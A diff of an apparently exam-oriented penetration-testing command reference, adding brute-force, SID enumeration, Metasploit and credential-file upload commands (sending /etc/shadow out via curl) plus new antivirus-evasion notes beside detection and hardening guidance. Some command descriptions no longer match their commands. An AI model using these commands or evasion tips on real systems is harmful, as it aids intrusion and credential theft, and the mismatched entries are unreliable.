-        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       },
       "variations": [
         {
@@ -34871,12 +36848,12 @@ const COMMAND_DATA = {
         {
           "description": "Upload file to uploadserver via curl (HTTP)",
           "command": "curl -X POST http://<ip>:8000/upload -F 'files=@/etc/passwd'",
-          "label": "POST request"
+          "label": "POST upload - single file"
         },
         {
           "description": "Upload multiple files to uploadserver via curl (HTTPS)",
           "command": "curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure",
-          "label": "POST request"
+          "label": "POST upload - multi-file (HTTPS)"
         },
         {
           "description": "SCP upload (push file to remote)",
@@ -35490,6 +37467,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "Null session",
+          "command": "lookupsid.py <domain>/@<dc_ip> -no-pass"
+        },
+        {
+          "label": "Brute RID range",
+          "command": "lookupsid.py <domain>/<user>:<password>@<dc_ip> 10000"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Enumerate SIDs/RIDs",
+          "command": "lookupsid.py <domain>/<user>:<password>@<dc_ip>"
+        },
+        {
+          "label": "Note the domain SID + Enterprise/Domain Admins RIDs",
+          "command": "# domain SID = base for forging tickets with /sids"
+        }
       ]
     },
     {
@@ -35650,7 +37647,7 @@ const COMMAND_DATA = {
       "id": "medusa-services-chain",
       "name": "Medusa - Multi-Service Brute Force Chain",
       "type": "attack-chain",
-      "command": "medusa -h <ip> -n <port> -u <user> -P <passwords.txt> -M ssh -t 3",
+      "command": "medusa -h <ip> -n <port> -u <user> -P <wordlist> -M ssh -t 3",
       "description": "Chains service brute forcing: brute SSH with known credentials clues, login to enumerate local services with netstat/nmap, then brute a discovered secondary service (e.g. FTP). Common exam pattern when a target exposes only one public port but runs additional services internally.",
       "platform": "linux",
       "requires": [
@@ -35686,7 +37683,7 @@ const COMMAND_DATA = {
       "steps": [
         {
           "label": "Brute force SSH with medusa",
-          "command": "medusa -h <ip> -n <port> -u <user> -P <passwords.txt> -M ssh -t 3"
+          "command": "medusa -h <ip> -n <port> -u <user> -P <wordlist> -M ssh -t 3"
         },
         {
           "label": "SSH login with found credentials",
@@ -35702,7 +37699,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "Brute force discovered secondary service (e.g. FTP on 21)",
-          "command": "medusa -h 127.0.0.1 -u <ftpuser> -P <passwords.txt> -M ftp -t 5"
+          "command": "medusa -h 127.0.0.1 -u <ftpuser> -P <wordlist> -M ftp -t 5"
         },
         {
           "label": "Login to secondary service with found credentials",
@@ -35777,7 +37774,7 @@ const COMMAND_DATA = {
     {
       "id": "medusa-bruteforce",
       "name": "Medusa - Service Brute Force",
-      "command": "medusa -h <ip> -u <user> -P <passwords.txt> -M <module>",
+      "command": "medusa -h <ip> -u <user> -P <wordlist> -M <module>",
       "description": "Parallel login brute forcer supporting many protocols via -M (ssh, ftp, mysql, rdp, imap, pop3, vnc, telnet, svn). -h/-H set a host or host file, -u/-U and -p/-P set credentials, -n a custom port, -t threads, -f stop on first hit per host, -e ns tries blank/username-as-password.",
       "platform": "linux",
       "requires": [
@@ -35869,17 +37866,17 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SSH",
-          "command": "medusa -h <ip> -n <port> -u <user> -P <passwords.txt> -M ssh -t 3",
+          "command": "medusa -h <ip> -n <port> -u <user> -P <wordlist> -M ssh -t 3",
           "description": "Brute force SSH with a known username. Keep threads low (-t 3) to avoid triggering fail2ban or lockouts."
         },
         {
           "label": "FTP",
-          "command": "medusa -h <ip> -n <port> -u <user> -P <passwords.txt> -M ftp -t 5",
+          "command": "medusa -h <ip> -n <port> -u <user> -P <wordlist> -M ftp -t 5",
           "description": "Brute force FTP. After success, login with: ftp ftp://<user>:<pass>@<ip>"
         },
         {
           "label": "SSH user+pass lists",
-          "command": "medusa -h <ip> -U <users.txt> -P <passwords.txt> -M ssh -f",
+          "command": "medusa -h <ip> -U <userlist> -P <wordlist> -M ssh -f",
           "description": "Brute force SSH with both username and password lists. -f stops on first success."
         }
       ],
@@ -35888,7 +37885,7 @@ const COMMAND_DATA = {
     {
       "id": "medusa-web-form",
       "name": "Medusa - Web Form Brute Force",
-      "command": "medusa -h <host> -U <users.txt> -P <passwords.txt> -M web-form -m FORM:\"<params>:F=<fail_text>\"",
+      "command": "medusa -h <host> -U <userlist> -P <wordlist> -M web-form -m FORM:\"<params>:F=<fail_text>\"",
       "description": "Medusa's web-form module brute forces HTTP login forms, an alternative to Hydra's http-post-form. -M selects the module and -m passes module options: the form parameters with ^USER^/^PASS^ and an F= failure marker. Medusa parallelizes across hosts well.",
       "platform": "linux",
       "requires": [
@@ -36145,7 +38142,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Checks a generated payload's detection rate on VirusTotal before deployment - an opsec check.",
+        "why_it_works": "The VirusTotal integration checks a payload's detection rate so you can gauge whether AV will flag it before deploying (OPSEC check).",
         "prerequisites": "A payload file and the VirusTotal API/plugin.",
         "impact": "Tells the operator whether AV vendors already flag the payload (attacker-side opsec, no target contact). Note: uploading to VT can leak the payload to defenders.",
         "sources": [
@@ -36154,7 +38151,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "Default msfvenom output is signatured — add an encoder/encryptor or a custom template, use a less-common format, and pack/obfuscate; better, generate raw shellcode and run it via a custom loader."
       },
       "variations": [
         {
@@ -36462,11 +38460,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "List",
-          "command": "creds",
-          "description": "List all captured credentials in MSF database"
-        },
-        {
           "label": "Add Password",
           "command": "creds add user:<user> password:<password> realm:<domain>",
           "description": "Export creds to file for offline use"
@@ -36483,7 +38476,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Lists credentials stored in the Metasploit database from prior loot/dumps.",
+        "why_it_works": "Metasploit's database aggregates credentials looted by modules into one store so they can be reused across the engagement.",
         "prerequisites": "msfconsole with the database connected.",
         "impact": "Reviews harvested credentials - a local db query, no target interaction.",
         "sources": [
@@ -36492,7 +38485,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -36675,11 +38669,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Version + Scripts",
-          "command": "db_nmap -sV -sC <ip>",
-          "description": "Run Nmap via MSF and auto-import results to DB"
-        },
-        {
           "label": "Full Aggressive",
           "command": "db_nmap -sV -p- -T5 -A <ip>",
           "description": "Run script scan and store all results"
@@ -36691,7 +38680,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "`db_nmap` runs an Nmap scan from within msfconsole and stores the results directly in the Metasploit database.",
+        "why_it_works": "db_nmap runs nmap and writes results straight into the MSF database, linking discovered services to exploit modules.",
         "prerequisites": "msfconsole with the db connected and network access to the target(s).",
         "impact": "Open ports/services enumerated and stored for module targeting.",
         "detection": "Identical to any Nmap scan on the target side: a burst of probes across ports/hosts in firewall/IDS logs; scan pattern detectable by IDS.",
@@ -36882,11 +38871,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Hosts",
-          "command": "hosts",
-          "description": "Show all hosts in current workspace"
-        },
-        {
           "label": "Services",
           "command": "services",
           "description": "Show all services (open ports) across hosts"
@@ -36903,7 +38887,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Queries the `hosts` and `services` tables in the Metasploit db to review discovered assets.",
+        "why_it_works": "The database query commands (hosts/services) list what's been discovered so you can pick targets for modules.",
         "prerequisites": "msfconsole with populated db.",
         "impact": "Reviews recon data already collected - a local database query, no target interaction.",
         "sources": [
@@ -36912,7 +38896,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -37109,11 +39094,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Import",
-          "command": "db_import <file>",
-          "description": "Import Nmap XML scan results into MSF workspace"
-        },
-        {
           "label": "Export",
           "command": "db_export -f xml <file>",
           "description": "Import Nessus / Qualys / Metasploit XML report"
@@ -37125,7 +39105,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Imports external scan results (e.g. Nmap XML) into the Metasploit database.",
+        "why_it_works": "Importing scanner output (nmap/Nessus) populates the MSF database with hosts/services so modules can target them without re-scanning.",
         "prerequisites": "msfconsole with the database connected and a scan file.",
         "impact": "Populates hosts/services in the db from prior recon - attacker-side, no new target traffic.",
         "sources": [
@@ -37134,7 +39114,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -37214,11 +39195,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Init",
-          "command": "sudo msfdb init",
-          "description": "Initialize MSF PostgreSQL database (first-time setup)"
-        },
-        {
           "label": "Status (shell)",
           "command": "sudo msfdb status",
           "description": "Start MSF with database and verify connection"
@@ -37235,7 +39211,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Initialises and connects the PostgreSQL database that backs Metasploit for storing scan/host/loot data.",
+        "why_it_works": "msfdb initialises the PostgreSQL backend Metasploit uses to persist hosts, services, loot, and sessions across the workspace.",
         "prerequisites": "msfconsole and PostgreSQL installed locally.",
         "impact": "Enables persistence of engagement data across the console - attacker-side setup.",
         "sources": [
@@ -37244,7 +39220,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -37331,7 +39308,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "Metasploit exploits a vulnerable public-facing web application to gain code execution on the underlying server.",
+        "why_it_works": "The module automates a known web-app exploit end-to-end (set target/creds, trigger the vuln, deliver a payload), abstracting the manual request chain.",
         "prerequisites": "Network access to a vulnerable web application and the matching MSF module.",
         "impact": "Code execution on the web server - commonly a shell as the web-server user.",
         "detection": "The exploit HTTP request is WAF/IDS-signatured; the web-server process spawns a shell child (Sysmon 1); a new outbound C2 connection appears from the server.",
@@ -37347,11 +39324,6 @@ const COMMAND_DATA = {
         "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
       },
       "variations": [
-        {
-          "description": "Select rConfig authenticated file upload RCE module",
-          "command": "use exploit/linux/http/rconfig_vendors_auth_file_upload_rce",
-          "label": "rconfig vendors auth file up"
-        },
         {
           "description": "Set target and run exploit",
           "command": "set RHOSTS <target_ip>\nset LHOST <attacker_ip>\nexploit",
@@ -37447,11 +39419,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Load",
-          "command": "use <index>",
-          "description": "Load a module by full path"
-        },
-        {
           "label": "Show Options",
           "command": "options",
           "description": "Load module by search result number"
@@ -37468,7 +39435,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "`use` selects a module into the console context so its options can be set and it can be run.",
+        "why_it_works": "use selects a module and loads its options into context; everything after operates on that module.",
         "prerequisites": "msfconsole and a chosen module.",
         "impact": "Loads a module ready to configure and launch (attacker-side).",
         "sources": [
@@ -37477,7 +39444,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -37551,11 +39519,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Load",
-          "command": "load <plugin>",
-          "description": "Load a plugin into msfconsole (e.g. pentest, nessus)"
-        },
-        {
           "label": "Install Then Load",
           "command": "sudo cp ./<plugin>.rb /usr/share/metasploit-framework/plugins/\nload <plugin>",
           "description": "List all loaded plugins"
@@ -37567,7 +39530,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Loads an msfconsole plugin (e.g. nessus, pentest) to add commands to the console.",
+        "why_it_works": "Plugins extend the msfconsole with extra commands (e.g. integrations); loading one registers those commands for the session.",
         "prerequisites": "msfconsole and the plugin available.",
         "impact": "Extends console functionality - attacker-side, no target contact.",
         "sources": [
@@ -37576,7 +39539,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
